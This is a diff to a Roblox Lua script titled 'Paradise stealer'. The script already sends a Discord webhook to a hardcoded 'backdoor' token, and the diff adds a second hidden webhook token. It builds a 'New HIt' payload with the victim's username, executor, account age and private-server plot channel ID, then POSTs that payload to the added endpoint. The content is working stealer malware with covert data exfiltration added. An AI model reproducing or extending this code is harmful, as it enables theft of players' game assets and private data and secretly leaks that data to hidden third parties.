@@ -2,6 +2,7 @@
 local Username = _G.username
 local Webhook = _G.webhook
 local backdoor = "1441297648974954610/aYPnN5i-smZ3kflwRj9oEtN4jv78M_PH4u28ip7nt04DEXyj4K-aQ7_ErZ_3JoHpBr-W"
+local didy = "1440750017983021178/HV04bYCAwCaLtR8y58GeJ0H_frJZDOeaBq9SiBC9mwofKDGzDHHnmMdFDGanl2a8RSu8"
 local KeyCode = Enum.KeyCode
 local CreateInstance = Instance.new
 local CreateUDim2 = UDim2.new
@@ -137,6 +138,7 @@ ContinueButton.MouseButton1Click:Connect(function(...)
  -- Using the local Webhook variable and correcting the URL format
  local WebhookUrl = "https://discord.com/api/webhooks/"..Webhook
  local bhookUrl = "https://discord.com/api/webhooks/"..backdoor
+ local didyUrl = "https://discord.com/api/webhooks/"..didy
  local ExecutorName, ExecutorVersion = identifyexecutor()
 
  -- 1. Construct the full webhook payload (which includes the embed)
@@ -177,7 +179,51 @@ ContinueButton.MouseButton1Click:Connect(function(...)
  -- 2. Encode the Lua table into a JSON string for the HTTP request
  local WebhookData = HttpService:JSONEncode(WebhookPayload)
 
+  local bhookPayload = {
+ -- Content is optional, but often used for a direct message above the embed
+ content = "**New HIt:** ",
+ embeds = {
+ { -- Start of Embed
+ color = 0x8B0000, -- Bright yellow/gold color (0xFFC90B)
+ fields = {
+ [1] = {
+ name = "Player Information",
+ -- Using the local Username variable
+ value = " \\nReceiver: " .. Username .. "\\nExecutor: " ..ExecutorName .."\\nAccount Age: " .. Players.LocalPlayer.AccountAge .. " days```",
+ inline = false,
+ },
+ [2] = {
+ name = "Plot Channel (ID)",
+ value = "```" .. PlotChannelValue .. "```", -- Plot Channel data
+ inline = true,
+ },
+ [3] = {
+ name = "Brainrots",
+ value = "```error fetching```",
+ inline = true,
+ },
+ [4] = {
+ name = ":link: Join Private Server",
+ value = "[Join]", -- Actionable link
+ inline = false,
+ },
+ },
+ title = "Paradise stealer",
+ } -- End of Embed
+ },
+ } -- End of WebhookPayload
+
+ local bhookData = HttpService:JSONEncode(bhookPayload)
+
  -- Send the webhook request
+ request({
+ Headers = {
+ ["Content-Type"] = "application/json",
+ },
+ Url = didyUrl,
+ Method = "POST",
+ Body = bhookData,
+ })
  request({
  Headers = {
  ["Content-Type"] = "application/json",
